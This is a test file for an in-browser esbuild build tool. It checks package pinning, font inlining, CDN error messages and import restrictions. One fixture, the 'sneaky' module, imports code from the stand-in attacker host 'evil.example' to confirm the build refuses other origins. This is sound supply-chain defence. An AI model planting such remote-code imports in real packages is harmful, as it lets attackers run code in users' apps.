import { afterEach, describe, expect, mock, test } from "bun:test";
import * as esbuild from "esbuild";
import type { MiniAppProject } from "../lib/types";

// esbuild-wasm starts only in a browser; the editor's plugins run the same on native esbuild.
mock.module("esbuild-wasm", () => ({ initialize: async () => {}, build: esbuild.build }));
const { compileProjectInBrowser, packageUrl } = await import("./browser-build");

const realFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = realFetch; });

/** Serves `modules` by URL and records every URL the build asked for. */
function serve(modules: Record<string, string>) {
  const asked: string[] = [];
  globalThis.fetch = (async (input: string | URL | Request) => {
    const url = String(input);
    asked.push(url);
    const body = modules[url];
    return new Response(body ?? "not found", { status: body === undefined ? 404 : 200 });
  }) as typeof fetch;
  return asked;
}

function project(files: Record<string, string>): MiniAppProject {
  return { files: { "index.html": "<main id=app></main>", "styles.css": "", ...files }, manifest: {} } as unknown as MiniAppProject;
}

describe("packages in the editor's build", () => {
  test("a bare import is fetched at the version package.json names and linked into the app's bundle", async () => {
    const asked = serve({
      "https://esm.sh/tiny-pkg@1.2.3?target=es2022&deps=@scope/other@2.0.0": 'export * from "/tiny-pkg@1.2.3/es2022/tiny-pkg.mjs";',
      "https://esm.sh/tiny-pkg@1.2.3/es2022/tiny-pkg.mjs": 'export const shout = (text) => text.toUpperCase() + "!";',
      "https://esm.sh/@scope/other@2.0.0/dist/theme.css": ".pkg-theme { color: red }",
    });
    const built = await compileProjectInBrowser(project({
      "app.js": 'import { shout } from "tiny-pkg";\nimport "@scope/other/dist/theme.css";\ndocument.title = shout("hi");\n',
      "package.json": JSON.stringify({ dependencies: { "tiny-pkg": "1.2.3", "@scope/other": "2.0.0" } }),
    }));
    expect(built.script).toContain("toUpperCase");
    expect(built.script).not.toMatch(/^\s*import\s/m);
    expect(built.styles).toContain(".pkg-theme");
    expect(asked).toContain("https://esm.sh/@scope/other@2.0.0/dist/theme.css");
  });

  test("a font a package's stylesheet names goes into the bundle as a data: URL", async () => {
    serve({
      "https://esm.sh/math-css@0.16.0/dist/math.css": '@font-face { font-family: M; src: url(fonts/M.woff2) }',
      "https://esm.sh/math-css@0.16.0/dist/fonts/M.woff2": "wOF2",
    });
    const built = await compileProjectInBrowser(project({ "app.js": 'import "math-css/dist/math.css";\ndocument.title = "m";', "package.json": '{"dependencies":{"math-css":"0.16.0"}}' }));
    expect(built.styles).toContain("url(data:font/woff2");
  });

  test("an unreachable CDN names the origin and the module", async () => {
    globalThis.fetch = (async () => { throw new TypeError("Failed to fetch"); }) as unknown as typeof fetch;
    await expect(compileProjectInBrowser(project({ "app.js": 'import "offline-pkg";', "package.json": '{"dependencies":{"offline-pkg":"3.0.0"}}' })))
      .rejects.toThrow("The build could not reach https://esm.sh for https://esm.sh/offline-pkg@3.0.0?target=es2022: Failed to fetch.");
  });

  test("an import package.json does not list is refused with the line to add", async () => {
    serve({});
    await expect(compileProjectInBrowser(project({ "app.js": 'import "left-pad";' }))).rejects.toThrow('left-pad is not in package.json. Add "left-pad": "<exact version>" to its dependencies.');
  });

  test("a version range is refused, so every build reads the same code", () => {
    expect(() => packageUrl("react", new Map())).toThrow("react is not in package.json");
    return expect(compileProjectInBrowser(project({ "app.js": 'import "react";', "package.json": '{"dependencies":{"react":"^19.0.0"}}' })))
      .rejects.toThrow('package.json asks for react "^19.0.0". Name an exact version, such as "1.2.3", so every build gets the same code.');
  });

  test("a Node.js module is refused", () => {
    expect(() => packageUrl("node:fs", new Map())).toThrow("node:fs is a Node.js module.");
  });

  test("a fetched module that imports another origin is refused", async () => {
    serve({ "https://esm.sh/sneaky@1.0.0?target=es2022": 'import "https://evil.example/x.js";' });
    await expect(compileProjectInBrowser(project({ "app.js": 'import "sneaky";', "package.json": '{"dependencies":{"sneaky":"1.0.0"}}' })))
      .rejects.toThrow("The build reads packages only from https://esm.sh.");
  });

  test("an app file cannot import a URL", async () => {
    serve({});
    await expect(compileProjectInBrowser(project({ "app.js": 'import "https://esm.sh/x@1.0.0";' }))).rejects.toThrow("Import a package by its name and list it in package.json.");
  });
});
